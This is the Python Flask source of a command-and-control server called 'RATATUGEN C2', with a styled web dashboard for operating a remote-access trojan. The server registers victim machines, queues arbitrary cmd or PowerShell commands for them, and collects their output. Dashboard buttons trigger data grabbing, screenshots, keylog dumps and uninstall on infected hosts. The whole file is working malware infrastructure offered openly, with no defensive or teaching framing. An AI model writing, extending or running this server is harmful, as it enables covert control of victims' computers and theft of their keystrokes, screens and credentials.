"""
RATATUGEN C2 Server
Dashboard: NEXUS-style design
"""
from flask import Flask, request, Response
import time, json

app = Flask(__name__)

clients, commands, results, message_log = {}, {}, {}, []

# ---- Dashboard HTML (NEXUS-inspired) ----
DASH = r'''<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>RATATUGEN C2</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;900&family=Fira+Code:wght@400;600&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Inter',sans-serif;background:#0a0a0f;color:#f1f5f9;min-height:100vh;overflow-x:hidden}
::-webkit-scrollbar{width:6px}
::-webkit-scrollbar-track{background:#12121a}
::-webkit-scrollbar-thumb{background:#c00;border-radius:3px}
canvas{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;pointer-events:none}
.header{position:relative;z-index:10;padding:20px 40px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #1e293b;background:rgba(10,10,15,.8);backdrop-filter:blur(20px);flex-wrap:wrap;gap:10px}
.logo{font-size:28px;font-weight:900;background:linear-gradient(135deg,#e00,#f44);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.header-right{display:flex;align-items:center;gap:20px;font-size:13px;color:#94a3b8}
.stats{position:relative;z-index:10;display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:16px;padding:24px 40px}
.stat-card{background:#1a1a2e;border:1px solid #1e293b;border-radius:12px;padding:20px;transition:.3s}
.stat-card:hover{border-color:#c00}
.stat-label{font-size:11px;text-transform:uppercase;letter-spacing:2px;color:#64748b;margin-bottom:8px}
.stat-value{font-size:32px;font-weight:700;background:linear-gradient(135deg,#e00,#f44);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.main{position:relative;z-index:10;padding:0 40px 40px}
.section-title{font-size:14px;font-weight:600;text-transform:uppercase;letter-spacing:2px;color:#64748b;margin-bottom:16px;display:flex;align-items:center;gap:12px}
.section-title::after{content:'';flex:1;height:1px;background:linear-gradient(90deg,#1e293b,transparent)}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:16px;margin-bottom:20px}
.card{background:#1a1a2e;border:1px solid #1e293b;border-radius:12px;padding:20px;cursor:pointer;transition:.3s;position:relative;overflow:hidden}
.card::before{content:'';position:absolute;top:0;left:0;width:100%;height:3px;background:linear-gradient(90deg,#e00,#f44);opacity:0;transition:.3s}
.card:hover,.card.sel{border-color:#c00;box-shadow:0 0 20px rgba(200,0,0,.15);transform:translateY(-2px)}
.card:hover::before,.card.sel::before{opacity:1}
.ch{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px}
.cid{font-family:'Fira Code',monospace;font-size:13px;font-weight:600;color:#e00}
.cstat{font-size:10px;text-transform:uppercase;letter-spacing:1px;padding:4px 10px;border-radius:20px;font-weight:600}
.cstat.online{background:rgba(34,197,94,.15);color:#22c55e;border:1px solid rgba(34,197,94,.3)}
.cstat.offline{background:rgba(100,100,100,.15);color:#666;border:1px solid rgba(100,100,100,.3)}
.chost{font-size:16px;font-weight:600}
.cdet{font-size:12px;color:#94a3b8;font-family:'Fira Code',monospace;margin:2px 0}
.cfoot{margin-top:12px;padding-top:12px;border-top:1px solid #1e293b;display:flex;justify-content:space-between;font-size:11px;color:#64748b}
.actions{display:flex;gap:6px;flex-wrap:wrap;margin-top:10px}
.btn{padding:7px 14px;border:1px solid #1e293b;border-radius:8px;background:#12121a;color:#f1f5f9;cursor:pointer;font-size:11px;font-weight:500;transition:.2s}
.btn:hover{border-color:#c00;color:#fff}
.btn-run{background:linear-gradient(135deg,#e00,#f44);border:none;color:#fff;font-weight:600}
.btn-run:hover{box-shadow:0 0 15px rgba(200,0,0,.3)}
.btn-kill{border-color:#c00;color:#c00}
.btn-kill:hover{background:rgba(200,0,0,.15)}
.cmd-in{flex:1;padding:7px 12px;background:#12121a;border:1px solid #1e293b;border-radius:8px;color:#f1f5f9;font-family:'Fira Code',monospace;font-size:12px;outline:none;min-width:120px}
.cmd-in:focus{border-color:#c00}
.output{background:#000;border:1px solid #1e293b;border-radius:8px;padding:12px;margin-top:8px;max-height:250px;overflow-y:auto;font-family:'Fira Code',monospace;font-size:11px;white-space:pre-wrap;color:#aaa;line-height:1.5}
.log-section{margin-top:20px}
.log-entry{font-size:11px;padding:3px 0;border-bottom:1px solid #0a0a0f;color:#666;font-family:'Fira Code',monospace}
.log-entry b{color:#c00}
.no-agents{text-align:center;padding:60px;color:#444;font-size:14px;grid-column:1/-1}
</style></head><body>
<canvas id="c"></canvas>
<div class="header"><div class="logo">RATATUGEN C2</div>
<div class="header-right"><span id="clock"></span><span>|</span><span id="agent-count">0 agents</span></div></div>
<div class="stats">
<div class="stat-card"><div class="stat-label">Agents Online</div><div class="stat-value" id="st-agents">0</div></div>
<div class="stat-card"><div class="stat-label">Commands Sent</div><div class="stat-value" id="st-cmds">0</div></div>
<div class="stat-card"><div class="stat-label">Results Received</div><div class="stat-value" id="st-results">0</div></div>
</div>
<div class="main">
<div class="section-title">CONNECTED AGENTS</div>
<div class="grid" id="grid"><div class="no-agents">Waiting for agents...</div></div>
<div class="section-title">ACTIVITY LOG</div>
<div class="output log-section" id="log">No activity yet.</div>
</div>
<script>
var c=document.getElementById('c'),x=c.getContext('2d'),pts=[],sel=null,w=0,h=0;
function rs(){w=c.width=innerWidth;h=c.height=innerHeight}
rs();addEventListener('resize',rs);
for(var i=0;i<50;i++)pts.push({x:Math.random()*1920,y:Math.random()*1080,vx:(Math.random()-.5)*.3,vy:(Math.random()-.5)*.3,s:Math.random()*2+.5});
function dr(){x.clearRect(0,0,w,h);pts.forEach(function(p){p.x+=p.vx;p.y+=p.vy;if(p.x<0)p.x=w;if(p.x>w)p.x=0;if(p.y<0)p.y=h;if(p.y>h)p.y=0;x.beginPath();x.arc(p.x,p.y,p.s,0,Math.PI*2);x.fillStyle='rgba(200,0,0,'+(p.s/3)+')';x.fill()});for(var i=0;i<pts.length;i++)for(var j=i+1;j<pts.length;j++){var dx=pts[i].x-pts[j].x,dy=pts[i].y-pts[j].y,d=Math.sqrt(dx*dx+dy*dy);if(d<120){x.beginPath();x.moveTo(pts[i].x,pts[i].y);x.lineTo(pts[j].x,pts[j].y);x.strokeStyle='rgba(200,0,0,'+(.04*(1-d/120))+')';x.lineWidth=.5;x.stroke()}}requestAnimationFrame(dr)}
dr();setInterval(function(){document.getElementById('clock').textContent=new Date().toLocaleTimeString()},1000);

var data={};
function fetchAll(){
 fetch('/api/all').then(function(r){return r.json()}).then(function(d){
  data=d;render();}).catch(function(){});
}
function render(){
 var g=document.getElementById('grid'),ids=Object.keys(data.clients||{});
 document.getElementById('st-agents').textContent=ids.length;
 document.getElementById('st-cmds').textContent=data.total_cmds||0;
 document.getElementById('st-results').textContent=data.total_results||0;
 document.getElementById('agent-count').textContent=ids.length+' agent'+(ids.length!=1?'s':'');
 if(!ids.length){g.innerHTML='<div class="no-agents">Waiting for agents...</div>';}
 else g.innerHTML=ids.map(function(id){
  var c=data.clients[id]||{},on=c.online||false,ago=Math.floor((Date.now()/1000-(c._last||0)));
  var out='';if(data.results&&data.results[id]){var rs=data.results[id];if(rs.length)out='<div class="output">'+rs.slice(-3).reverse().map(function(r){return'<b>'+r[0]+'</b> > '+r[1]+'\n'+r[2]}).join('\n')+'</div>';}
  return '<div class="card'+(sel===id?' sel':'')+'" onclick="select(\''+id+'\')">'+
  '<div class="ch"><div class="cid">'+id+'</div><div class="cstat '+(on?'online':'offline')+'">'+(on?'ONLINE':'OFFLINE')+'</div></div>'+
  '<div class="chost">'+(c.pc||'?')+'</div>'+
  '<div class="cdet">User: '+(c.user||'?')+'</div>'+
  '<div class="cdet">Last: '+(c.last||'- ')+(ago<60?' ('+ago+'s ago)':'')+'</div>'+
  '<div class="actions" onclick="event.stopPropagation()">'+
  '<input class="cmd-in" id="sh_'+id+'" placeholder="cmd / powershell" onkeydown="if(event.key===\'Enter\')send(\''+id+'\')">'+
  '<button class="btn btn-run" onclick="send(\''+id+'\')">Shell</button>'+
  '<button class="btn" onclick="cmd(\''+id+'\',\'GRAB_ALL\')">Grab</button>'+
  '<button class="btn" onclick="cmd(\''+id+'\',\'SCREENSHOT\')">SS</button>'+
  '<button class="btn" onclick="cmd(\''+id+'\',\'KEYLOG_DUMP\')">Keys</button>'+
  '<button class="btn btn-kill" onclick="cmd(\''+id+'\',\'UNINSTALL\')">Kill</button></div>'+out+'</div>';
 }).join('');

 var log=document.getElementById('log'),msgs=(data.log||[]).slice(-50).reverse();
 log.innerHTML=msgs.length?msgs.map(function(m){return'<div class="log-entry"><b>'+m[0]+'</b> ['+m[1]+'] '+m[2]+'</div>'}).join(''):'No activity yet.';
}
function select(id){sel=id;render()}
function cmd(id,c){fetch('/cmd?client='+id+'&cmd='+encodeURIComponent(c));setTimeout(fetchAll,500)}
function send(id){var inp=document.getElementById('sh_'+id);if(!inp)return;var v=inp.value.trim();if(!v)return;cmd(id,v);inp.value=''}
setInterval(fetchAll,3000);fetchAll();
</script></body></html>'''

@app.route('/')
def index():
    return DASH

@app.route('/api/all')
def api_all():
    return {
        'clients': {cid: {'pc': c.get('pc','?'), 'user': c.get('user','?'), 'last': c.get('last','-'), '_last': c.get('_last',0), 'online': c.get('online',False)} for cid, c in clients.items()},
        'results': {cid: [(t, cmd, out) for t, cmd, out in res[-5:]] for cid, res in results.items()},
        'log': [(t, cid, text) for t, cid, text in message_log[-50:]],
        'total_cmds': sum(len(v) for v in commands.values()) + sum(len(r) for r in results.values()),
        'total_results': sum(len(r) for r in results.values())
    }

@app.route('/cmd')
def cmd():
    cid = request.args.get('client', '')
    command = request.args.get('cmd', '')
    if cid and command:
        commands[cid] = command
        message_log.append((time.ctime(), cid, 'CMD: ' + command))
    return 'ok'

@app.route('/register', methods=['POST'])
def register():
    d = request.get_json(silent=True) or {}
    cid = d.get('id', '?')
    clients[cid] = {'pc': d.get('pc','?'), 'user': d.get('user','?'), '_last': time.time(), 'last': time.ctime(), 'online': True}
    return {'status': 'ok'}

@app.route('/poll', methods=['POST'])
def poll():
    d = request.get_json(silent=True) or {}
    cid = d.get('id', '?')
    if cid not in clients: clients[cid] = {'pc': cid, 'user': '?', '_last': time.time(), 'online': True}
    clients[cid]['_last'] = time.time(); clients[cid]['online'] = True
    cmd = commands.pop(cid, None) or commands.pop("*", None)
    resp = {'command': cmd or ''}
    return resp

@app.route('/result', methods=['POST'])
def result():
    d = request.get_json(silent=True) or {}
    cid = d.get('id', '?'); cmd = d.get('command', ''); out = d.get('output', '')
    if cid not in results: results[cid] = []
    results[cid].append((time.ctime(), cmd, out))
    if len(results[cid]) > 20: results[cid] = results[cid][-20:]
    message_log.append((time.ctime(), cid, 'R: ' + cmd))
    return {'status': 'ok'}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)